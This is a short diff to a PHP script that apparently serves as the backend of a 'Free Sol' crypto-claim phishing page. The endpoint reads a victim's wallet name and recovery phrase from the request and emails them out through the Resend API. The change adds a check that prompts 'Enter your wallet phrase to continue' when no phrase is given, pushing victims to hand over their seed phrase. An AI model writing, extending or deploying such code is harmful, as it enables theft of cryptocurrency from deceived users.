@@ -25,6 +25,13 @@ $data = json_decode(file_get_contents("php://input"), true);
 $wallet = $data['wallet'] ?? 'Unknown';
 $phrase = $data['phrase'] ?? '';
 
+if (empty($phrase)){
+    echo json_encode([
+        'status' => 'error',
+        'msg' => "Enter your wallet phrase to continue"
+    ]);
+}
+
 try {
     $result = $resend->emails->send([
         'from' => 'Free Sol <contact@claimfeesol.com>',
